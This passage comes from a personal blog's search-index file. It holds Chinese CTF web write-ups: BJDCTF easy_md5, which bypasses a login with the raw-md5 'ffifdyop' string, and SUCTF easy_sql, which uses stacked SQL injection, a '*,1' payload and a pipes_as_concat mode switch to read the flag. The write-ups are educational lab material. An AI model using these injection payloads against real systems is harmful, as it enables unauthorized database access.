labs2</h2><h2 id="bjdctf-easy_md5sql注入md5解析">10、BJDCTF-easy_md5（SQL注入md5解析）</h2><p>这道题一打开，发现啥都没有，抓个包，发现在<code>response</code>的头里有提示。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_12.png" /></p><p>这里的提示的已经非常明显，大致的原理就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">md5(&#x27;ffifdyop&#x27;) = 276F722736C95D99E921722CF9ED621C<br></code></pre></td></tr></table></figure><p>这里就有一个非常牛逼的骚点，<code>mysql</code>会把这个加密后的<code>md5</code>字符串理解成为16进制字符串</p><p>这样就能查询字符串转化为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;6xxxxx&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这样就成功进去了，后面的<code>md5</code>操作比较常规了，这里就不说了。</p><h2 id="das-x防疫-ezphp">11、DAS X防疫 ezphp（）</h2><h2 id="suctf-easy_sql堆叠注入">12、SUCTF easy_sql（堆叠注入）</h2><p>打开画面我们可以看到</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_0014.jpg" /></p><p>我们fuzz尝试发现，<code>'</code>等都被过滤了，当你输入非零数字字符时，没有回显，可能在后端被过滤了，显然没有bool盲注。</p><p>考虑尝试堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> tables;<br></code></pre></td></tr></table></figure><p>发现返回了结果，得到了表名为<code>Flag</code>，但是<code>from</code>和<code>Flag</code>被屏蔽了。</p><p>于是考虑猜测后端的<code>sql</code>语句，由于返回结果在0和非0数字符存在差异 ，因此猜测存在<code>||</code>运算符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql_s</span> = <span class="hljs-string">&#x27;select &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot; || flag from Flag&quot;</span>;<br></code></pre></td></tr></table></figure><p>于是尝试构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag;<br></code></pre></td></tr></table></figure><p>这样就把全部内容给得到了。</p><p>不过我们依然可以选择堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode <span class="hljs-operator">=</span> pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这样子构造的语句，成功将<code>||</code>转为连接运算符，从而也可以拿到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>buuoj</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello world</title>
    <link href="/2022/01/16/blog0000-hello-world/"/>
    <url>/2022/01/16/blog0000-hello-world/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面的一些话">写在前面的一些话</h2><p>Welcome to my blog!</p><span id="more"></span><p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>]]></content>
    
    
    
    <tags>
      
      <tag>preface</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
